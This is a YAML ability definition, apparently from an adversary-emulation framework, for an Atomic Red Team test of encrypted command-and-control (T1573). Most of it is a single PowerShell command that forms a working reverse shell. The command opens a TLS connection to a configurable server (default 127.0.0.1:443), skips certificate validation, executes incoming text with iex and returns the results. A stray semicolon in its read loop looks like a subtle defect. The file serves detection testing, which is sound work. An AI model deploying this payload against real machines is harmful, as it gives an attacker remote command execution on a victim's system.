- id: 21caf58e-87ad-440c-a6b8-3ac259964003
  name: OpenSSL C2
  description: 'Thanks to @OrOneEqualsOne for this quick C2 method.

    This is to test to see if a C2 session can be established using an SSL socket.

    More information about this technique, including how to set up the listener, can
    be found here:

    https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926


    Upon successful execution, powershell will make a network connection to 127.0.0.1
    over 443.'
  tactic: command-and-control
  technique:
    attack_id: T1573
    name: Encrypted Channel
  platforms:
    windows:
      psh:
        command: $server_ip = 127.0.0.1; $server_port = 443; $socket = New-Object
          Net.Sockets.TcpClient('127.0.0.1', '443'); $stream = $socket.GetStream();
          $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True}
          -as [Net.Security.RemoteCertificateValidationCallback])); $sslStream.AuthenticateAsClient('fakedomain.example',
          $null, "Tls12", $false); $writer = new-object System.IO.StreamWriter($sslStream);
          $writer.Write('PS ' + (pwd).Path + '> '); $writer.flush(); [byte[]]$bytes
          = 0..65535|%{0};; while(($i = $sslStream.Read($bytes, 0, $bytes.Length))
          -ne 0); {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,
          $i);; $sendback = (iex $data | Out-String ) 2>&1;; $sendback2 = $sendback
          + 'PS ' + (pwd).Path + '> ';; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);;
          $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - atomic-red-team
  - command-and-control
  - t1573
  author: Atomic Red Team
  additional_info:
    input_arguments:
      server_ip:
        description: IP of the external server
        type: string
        default: 127.0.0.1
      server_port:
        description: The port to connect to on the external server
        type: string
        default: '443'
    technique_created: '2020-03-16T15:33:01.739Z'
    atomic_guid: 21caf58e-87ad-440c-a6b8-3ac259964003
    import_timestamp: '2025-09-19T03:02:31.554716Z'
